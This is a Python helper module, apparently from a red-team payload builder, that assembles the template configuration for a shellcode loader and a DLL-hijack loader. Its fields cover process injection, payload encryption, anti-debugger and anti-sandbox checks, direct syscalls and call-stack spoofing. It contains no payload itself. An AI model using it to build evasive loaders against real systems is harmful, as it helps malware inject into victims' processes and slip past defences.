"""Pure helpers for the loader config.hpp Jinja context.

R2b split: this module owns the `config_data` dict construction that feeds
the `config.hpp` Jinja template. Both the Shellcode Loader and the DLL
Hijack paths render the same template with slightly different input
shapes; they both go through the single helper here, with parameters
keyword-only so call sites document intent at the point of call.

Rendering + disk writes stay in builder.py - this module is 100% pure
(no Jinja env, no file I/O) so it can be exercised by unit tests with
fixture dicts.

Historical note: before R2b, each render site open-coded a ~20-key dict
literal twice (Shellcode Loader at ~2473-2490, DLL Hijack at ~2580-2640
pre-refactor). The two literals had subtle divergences - e.g. the Hijack
path hardcoded `INJECTION_TYPE = 2` (CreateFiber) because the DLL runs
in-process - which made it easy to accidentally skew them when adding a
new guardrail field. This helper enforces a single shape: every field the
template expects is a named kwarg, so forgetting one is a TypeError, not
a silent None landing in the template.
"""

from typing import List, Optional


def build_loader_config_data(
    *,
    target_process: str,
    injection_type,
    compression_type_value,
    encoding_type_value,
    encryption_type_value,
    encryption_key_bytes: str,
    encryption_iv_bytes: str,
    guardrails_enabled,
    guardrails_check_debugger,
    guardrails_check_remote_debugger,
    guardrails_check_debugger_processes,
    guardrails_check_hardware_breakpoints,
    guardrails_check_timing,
    guardrails_check_sandbox,
    guardrails_decoy_file: str = "",
    gr_block: Optional[dict] = None,
    syscall_backend: int = 0,
    callstack_spoof_enabled: int = 0,
    callstack_spoof_modules: Optional[List[str]] = None,
) -> dict:
    """Assemble the `config_data` dict fed to the `config.hpp` template.

    `gr_block` is the output of `collect_guardrail_gr_lists(...)` - a
    dict containing the XOR-encrypted guardrail byte arrays, the random
    key, and the per-list counts. Passing None (or omitting it) leaves
    those template variables unset, which matches the disabled-guardrails
    render path in the template.

    `injection_type`: on the Shellcode Loader side this is the operator
    choice from parameter "0.4"; on the Hijack side it is always 2
    (CreateFiber / self-injection because the DLL already runs in the
    hijacked process). Callers pass the integer directly.

    `target_process`: caller is responsible for any escaping (the
    Shellcode Loader path doubles backslashes for C++ wide-string
    literals; the Hijack path passes an empty string because it injects
    into its own process).
    """
    data = {
        "TARGET_PROCESS": target_process,
        "INJECTION_TYPE": injection_type,
        "COMPRESSION_TYPE": compression_type_value,
        "ENCODING_TYPE": encoding_type_value,
        "ENCRYPTION_TYPE": encryption_type_value,
        "ENCRYPTION_KEY": encryption_key_bytes,
        "ENCRYPTION_IV": encryption_iv_bytes,
        "GUARDRAILS_ENABLED": guardrails_enabled,
        "GUARDRAILS_CHECK_DEBUGGER": guardrails_check_debugger,
        "GUARDRAILS_CHECK_REMOTE_DEBUGGER": guardrails_check_remote_debugger,
        "GUARDRAILS_CHECK_DEBUGGER_PROCESSES": guardrails_check_debugger_processes,
        "GUARDRAILS_CHECK_HARDWARE_BREAKPOINTS": guardrails_check_hardware_breakpoints,
        "GUARDRAILS_CHECK_TIMING": guardrails_check_timing,
        "GUARDRAILS_CHECK_SANDBOX": guardrails_check_sandbox,
        "GUARDRAILS_DECOY_FILE": guardrails_decoy_file,
        "SYSCALL_BACKEND": syscall_backend,
        "CALLSTACK_SPOOF_ENABLED": callstack_spoof_enabled,
        "CALLSTACK_SPOOF_MODULES": list(callstack_spoof_modules or
            ["ntdll.dll", "kernel32.dll", "kernelbase.dll"]),
    }
    if gr_block:
        data.update(gr_block)
    return data
